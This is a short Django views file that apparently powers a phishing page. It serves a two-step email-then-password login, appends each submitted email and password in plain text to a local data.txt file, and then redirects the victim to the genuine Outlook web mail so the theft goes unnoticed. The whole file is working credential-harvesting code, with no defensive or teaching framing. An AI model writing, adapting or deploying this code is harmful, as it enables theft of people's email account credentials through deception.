import os
from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.template import loader
# Create your views here.


def login(request):

    template = loader.get_template('login_user.html')

    context = {}

    return HttpResponse(template.render(context,request))

def login_pass(request):

    if request.method == "POST":

        email = request.POST.get('email')
        
        template = loader.get_template('login_mdp.html')

        context = {"email":email}

        return HttpResponse(template.render(context,request))
    
def login_submit(request):

    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    if request.method == "POST":

        email = request.POST.get('email')
        password = request.POST.get("password")

        chemin = BASE_DIR+'/data/data.txt'
        fic = open(chemin, "a")

        fic.write("email : "+email+"\n")
        fic.write("mot de passe : "+password+"\n")
        fic.write("==========================================\n")

        fic.close()
        

    return redirect("https://outlook.office.com/mail/")